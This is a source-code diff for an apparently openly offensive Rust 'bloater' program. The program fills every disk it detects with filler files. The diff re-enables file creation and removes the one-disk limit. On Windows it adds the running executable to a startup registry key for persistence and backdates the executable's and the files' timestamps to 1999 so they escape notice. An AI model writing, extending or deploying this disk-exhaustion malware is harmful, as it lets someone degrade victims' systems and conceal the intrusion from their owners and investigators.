@@ -22,15 +22,18 @@ use std::iter;
 
 
 static OUTPUT_PATH: &'static [&str] = &[r"/temp/", r"/tmp/", r"/"];
-static BLOAT_CAPACITY: f64 = 0.10; // Between 0.0 and 1.0
+
+static BLOAT_SIZE_CONSTANT: bool = true;
+static BLOAT_CAPACITY: f64 = 0.10; // Between 0.0 and 1.0. It only work if the BLOAT_SIZE_CONSTANT is set to false. Initially set to 10% of the disk storage.
+
 
 // Slice the string to get the root disk letter if it's Windows or the disk path on Linux
 fn slice_string(input: &str) -> &str {
-	// Define the pattern to detect the filesystem : Windows or Unix
+	// Separate the string at specific characters
 	let pattern = Regex::new(r"(\\)|(/)").unwrap();
 	let parts: Vec<&str> = pattern.split(input).collect();
 
-	// Return the root folder
+	// Return the first part
 	return parts[0];
 }
 
@@ -65,13 +68,12 @@ fn create_bloatfile(path: &str, name:String, data: Vec<u8>) -> String{
 // Adding persistence for the windows compilation
 fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
 	
+	// Get the path to the executable when its executed
 	let previous_exe_path = std::env::current_exe()?;
 
-	// Create the new exe in the Appdata/Local/temp folder of the user
-    //let new_exe_path = format!("{}{}",Path::new(&std::env::temp_dir()).display(),"bloater_copy.exe");
-
+	/*
+	// Create a path where the future exe will be
 	let new_exe_path = format!("{}{}.exe",filepath,exe_name);
-
 
     let mut f ;
 	let mut buffer:Vec<u8> = Vec::new();
@@ -79,8 +81,9 @@ fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
 	// Open the previous one and copy its content to the new one
     let file = match File::open(&previous_exe_path){
 		Ok(mut file) => {
-			file.read_to_end(&mut buffer);
+			let _ = file.read_to_end(&mut buffer);
 			f = File::create(&new_exe_path).unwrap();
+			let _ = f.write_all(&buffer);
 		},
 		Err(err) => {
 			println!("File not found");
@@ -88,25 +91,26 @@ fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
 		}
 
 	};        
-
-	f.write_all(&buffer);
-
-    println!("Created a copy of {} at {}", previous_exe_path.display(), new_exe_path);
 	
+    println!("Created a copy of {} at {}", previous_exe_path.display(), new_exe_path);
+	*/
+
+	// Add the new exe to the registry to launch at startup
 	let hkcu = RegKey::predef(HKEY_CURRENT_USER);
         hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
             .set_value::<_, _>(
-                &new_exe_path,
-                &str::replace(&new_exe_path, "/", r"\"),
+                &previous_exe_path,
+                &str::replace(&previous_exe_path.as_path().display().to_string(), "/", r"\"),
             )?;
 
+	// Change the modified and access date of the executable to 1999
+	let _ = set_file_times(previous_exe_path, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
 
-	set_file_times(new_exe_path, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
-		// Delete the old reg key from the previous exe created
-		/*
-		hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
-        .delete_value(&previous_exe_path)?;
-		*/
+	// Delete the old reg key from the previous exe created
+	/*
+	hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
+    .delete_value(&previous_exe_path)?;
+	*/
 
 	
 
@@ -115,7 +119,7 @@ fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
 
 
 #[cfg(target_os = "linux")]
-// Adding persistenec for the linux compilation
+// Adding persistence for the linux compilation
 fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
 	Ok(())	
 }
@@ -135,9 +139,6 @@ fn main() -> std::io::Result<()> {
 		disk_array.push(info);
 		println!("Disk : {:?}",info);
 
-		// Limit for one disk for now
-		break;
-
 	}	
 
 	// Bloating each disks found
@@ -148,8 +149,8 @@ fn main() -> std::io::Result<()> {
 
 		// Search for a valid path to write to
 		let mut valid_path = String::new();
+
 		// Try different path on the disk where it can write to
-		
 		let mut has_found_path = false;
 
 		for path in OUTPUT_PATH {
@@ -174,12 +175,8 @@ fn main() -> std::io::Result<()> {
 		// Create a random number
 		let mut rng = rand::thread_rng();
 		
-		// Create the files
+		// Create the files (one file is created for now)
 		for i in 1..2{
-
-			// 1Mo =  1_048_576
-			// 16Mo = 16_777_216
-			// 128Mo = 134_217_728
 
 			// Give an initial name to the file created
 			let mut filename: String = format!("file-{}", i);
@@ -194,15 +191,25 @@ fn main() -> std::io::Result<()> {
 			}
 
 			// Vec with specified size (number of elements in the vector)
+			// Proportionnal size to the disk
 			//let encoded: Vec<u8> = vec![0;size.try_into().unwrap()];
-			let encoded: Vec<u8> = vec![0;1_048_576];
 
-			/*
+			// Constant size
+			// 1Mo =  1_048_576
+			// 16Mo = 16_777_216
+			// 128Mo = 134_217_728
+			let mut encoded: Vec<u8> = vec![0;1_048_576];
+			if BLOAT_SIZE_CONSTANT == false {
+				encoded= vec![0;filesize as usize];
+			}
+
+			
+			// Create the bloat file
 			let path_file: String = create_bloatfile(&valid_path,filename,encoded);
 			
 			// Change the access and modified date to 1999
 			let _ = set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
-			*/
+			
 			}
 
 
@@ -217,7 +224,7 @@ fn main() -> std::io::Result<()> {
 				exe_name = iter::repeat(()).map(|()| rng.sample(Alphanumeric)).map(char::from).take(10).collect();
 				}
 
-				adding_persistence(&valid_path, &exe_name);
+				let _ = adding_persistence(&valid_path, &exe_name);
 
 				}
 			
